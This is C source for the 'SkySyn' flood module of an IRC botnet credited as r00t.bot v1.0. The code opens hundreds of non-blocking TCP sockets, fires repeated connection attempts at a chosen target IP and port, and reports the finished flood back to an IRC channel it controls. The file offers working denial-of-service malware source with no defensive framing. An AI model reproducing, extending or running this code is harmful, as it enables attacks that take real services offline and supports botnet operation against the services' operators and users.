/*

        _______  _______   __    ___.           __   
_______ \   _  \ \   _  \_/  |_  \_ |__   _____/  |_ 
\_  __ \/  /_\  \/  /_\  \   __\  | __ \ /  _ \   __\
 |  | \/\  \_/   \  \_/   \  |    | \_\ (  <_> )  |  
 |__|    \_____  /\_____  /__|   /\___  /\____/|__|  
               \/ Affix \/       \/   \/ iHack.co.uk
			   
				 r00t.bot v1.0
				 ASN - Affix
				 SkySyn - Affix
				 Connection(recode) - Affix
				 Shellcode - h1dd3n
				 ftpd - Affix

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SKYSYN

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define SKYSYN_SOCKETS 400


#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

DWORD WINAPI SkySynThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	SKYSYN skysyn = *((SKYSYN *)param);
	SKYSYN *skysyns = (SKYSYN *)param;
	skysyns->gotinfo = TRUE;

	sprintf(sendbuf, "-\x03\x34\2skysyn\2\x03- Done with flood (%iKB/sec)", SkySyn(skysyn.ip, skysyn.port, skysyn.length));
	if (!skysyn.silent) irc_privmsg(skysyn.sock, skysyn.chan, sendbuf, skysyn.notice); 
	addlog(sendbuf);

	clearthread(skysyn.threadnum);

	ExitThread(0); 
}

long SkySynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
{ 
	int skydelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         sock[SKYSYN_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = fhtons(TargetPort);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = TargetIP;
	SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < len) {
		for (c=0;c<SKYSYN_SOCKETS;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<SKYSYN_SOCKETS;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(skydelay);     
		for (c=0;c<SKYSYN_SOCKETS;c++)
			closesocket(sock[c]); //close sockets
		i++;
	}
	return 0;
}

long SkySyn(char *target, char *port, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);

	long num = SkySynSend(TargetIP, p, t);

	if (num == 0) 
		num = 1;  
	num = num / 1000 / t;

	return num;
}

#endif
